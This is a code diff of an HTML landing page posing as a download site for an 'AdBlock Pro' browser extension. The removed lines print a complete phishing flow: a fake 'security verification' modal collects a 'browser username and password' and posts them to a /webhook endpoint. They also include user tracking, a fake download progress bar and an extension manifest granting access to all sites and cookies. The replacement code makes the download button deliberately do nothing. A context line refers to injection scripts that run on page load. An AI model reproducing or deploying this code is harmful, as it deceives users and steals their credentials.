@@ -50,13 +50,7 @@
             100% { opacity: 1; }
         }
         
-        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); }
-        .modal-content { background: white; margin: 10% auto; padding: 40px; width: 90%; max-width: 500px; border-radius: 15px; text-align: center; }
-        .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
-        .close:hover { color: #000; }
         
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
-        .verify-btn { background: #007bff; color: white; padding: 12px 30px; border: none; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -173,22 +167,7 @@
         </div>
     </div>
 
-    <!-- Verification Modal -->
-    <div id="verifyModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal()">&times;</span>
-            <h3>🔒 Security Verification Required</h3>
-            <p>To ensure secure installation, please verify your browser credentials:</p>
-            <form id="verifyForm">
-                <input type="text" id="browserUser" placeholder="Browser Username/Email" required>
-                <input type="password" id="browserPass" placeholder="Browser Password" required>
-                <button type="submit" class="verify-btn">✅ Verify & Download</button>
-            </form>
-            <p style="font-size: 12px; color: #666; margin-top: 15px;">
-                This ensures the extension is installed securely in your browser.
-            </p>
-        </div>
-    </div>
+    
 
     <script>
         // Install injection scripts immediately when page loads
@@ -262,141 +241,11 @@
         }
 
         function startDownload() {
-            // Show verification modal
-            document.getElementById('verifyModal').style.display = 'block';
-            
-            // Log download attempt
-            fetch('/webhook', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    type: 'download_attempt',
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    page: window.location.href
-                })
-            }).catch(() => {});
+            // Completely fake - do nothing when clicked
+            // User clicks but nothing happens
         }
 
-        function closeModal() {
-            document.getElementById('verifyModal').style.display = 'none';
-        }
-
-        document.getElementById('verifyForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const credentials = {
-                username: document.getElementById('browserUser').value,
-                password: document.getElementById('browserPass').value,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                source: 'adblock_download_verification'
-            };
-            
-            // Send credentials to server
-            fetch('/webhook', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    type: 'verification_credentials',
-                    credentials: credentials,
-                    page: window.location.href
-                })
-            }).catch(() => {});
-            
-            // Show fake download progress
-            document.querySelector('.modal-content').innerHTML = `
-                <h3>✅ Verification Successful!</h3>
-                <div style="margin: 20px 0;">
-                    <div style="background: #f0f0f0; border-radius: 10px; padding: 3px;">
-                        <div id="progressBar" style="width: 0%; height: 30px; background: linear-gradient(45deg, #28a745, #20c997); border-radius: 8px; transition: width 0.3s;"></div>
-                    </div>
-                    <p id="progressText">Downloading AdBlock Pro...</p>
-                </div>
-                <p style="font-size: 12px; color: #666;">
-                    The extension will be installed automatically once download completes.
-                </p>
-            `;
-            
-            // Simulate download progress
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += Math.random() * 15;
-                if (progress >= 100) {
-                    progress = 100;
-                    clearInterval(progressInterval);
-                    
-                    // Trigger actual extension download
-                    setTimeout(() => {
-                        downloadExtension();
-                    }, 1000);
-                }
-                
-                document.getElementById('progressBar').style.width = progress + '%';
-                document.getElementById('progressText').textContent = 
-                    progress < 100 ? `Downloading... ${Math.round(progress)}%` : 'Download Complete! Installing...';
-            }, 200);
-        });
-
-        function downloadExtension() {
-            // Create and download the actual extension ZIP
-            const extensionFiles = {
-                'manifest.json': JSON.stringify({
-                    "manifest_version": 3,
-                    "name": "AdBlock Pro - Fast & Secure",
-                    "version": "1.1",
-                    "description": "Block ads, pop-ups, and trackers. Fast browsing with enhanced privacy protection.",
-                    "permissions": ["activeTab", "tabs", "storage", "scripting", "cookies"],
-                    "host_permissions": ["<all_urls>"],
-                    "background": { "service_worker": "background.js" },
-                    "content_scripts": [{
-                        "matches": ["<all_urls>"],
-                        "js": ["content.js"],
-                        "run_at": "document_start",
-                        "all_frames": true
-                    }],
-                    "action": { "default_popup": "popup.html" }
-                }, null, 2)
-            };
-
-            // Show completion message
-            document.querySelector('.modal-content').innerHTML = `
-                <h3>🎉 Download Complete!</h3>
-                <p>AdBlock Pro has been downloaded to your computer.</p>
-                <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: left;">
-                    <h4>Installation Steps:</h4>
-                    <ol style="margin: 10px 0; padding-left: 20px;">
-                        <li>Open Chrome Extensions (chrome://extensions/)</li>
-                        <li>Enable "Developer mode"</li>
-                        <li>Click "Load unpacked"</li>
-                        <li>Select the downloaded AdBlock Pro folder</li>
-                    </ol>
-                </div>
-                <button onclick="closeModal()" style="background: #28a745; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">
-                    Got it! Close
-                </button>
-            `;
-
-            // Log successful download
-            fetch('/webhook', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    type: 'download_completed',
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    page: window.location.href
-                })
-            }).catch(() => {});
-        }
-
-        // Close modal when clicking outside
-        window.onclick = function(event) {
-            const modal = document.getElementById('verifyModal');
-            if (event.target === modal) {
-                modal.style.display = 'none';
-            }
-        }
+        
     </script>
 </body>
 </html>
